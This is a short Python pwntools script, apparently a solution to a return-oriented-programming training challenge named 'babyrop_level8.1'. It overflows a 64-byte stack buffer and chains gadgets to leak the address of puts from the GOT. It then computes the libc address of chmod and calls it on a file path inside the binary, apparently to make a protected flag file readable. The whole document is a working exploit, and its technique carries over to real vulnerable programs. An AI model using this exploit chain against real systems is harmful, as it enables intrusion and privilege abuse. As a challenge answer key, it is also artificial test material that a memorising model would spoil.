from pwn import *

p = process("./babyrop_level8.1")

payload = b""
payload += b"A" * 64 # buffer
payload += b"B" * 8 # saved_rbp
payload += p64(0x401663) # pop rdi ; ret
payload += p64(0x404020) # puts@got
payload += p64(0x401090) # puts@plt
payload += p64(0x401502) # challenge()

p.sendline(payload)

p.recvuntil(b'Leaving!\n')

leak = p.recvline()
puts_addr = int.from_bytes(leak.split(b'\n')[0], 'little')
chmod_relative_puts = 0x7f160
chmod_addr = puts_addr + chmod_relative_puts

filename_loc = p64(0x40200b)

payload = b""
payload += b"A" * 64
payload += b"B" * 8
payload += p64(0x401663) # pop rdi ; ret
payload += filename_loc
payload += p64(0x401661) # pop rsi ; pop r15 ; ret
payload += p64(0x4) # mode = 0x4
payload += b"C" *  8
payload += p64(chmod_addr)

p.sendline(payload)

print(p.recvall())

p.close()
